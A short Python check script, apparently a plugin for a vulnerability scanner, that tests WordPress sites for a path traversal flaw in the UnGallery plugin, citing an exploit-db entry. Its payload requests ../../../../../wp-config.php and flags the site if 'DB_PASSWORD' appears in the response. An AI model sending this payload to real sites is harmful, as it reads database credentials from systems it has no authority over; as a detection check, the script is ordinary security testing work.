#!/usr/bin/env python
# coding=utf-8
# refer: http://www.exploit-db.com/exploits/17704/
#__author__ = 'Tiny'


def assign(service, arg):
    if service == "wordpress":
        return True, arg
def audit(args):
    payload = '/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php'
    verify_url = args + payload
    code, head, content, errcode,finalurl = curl.curl(verify_url)
    if code==200 and 'DB_PASSWORD' in content:
        security_warning(verify_url)



        return args
if __name__== '__main__':
    from dummy import *
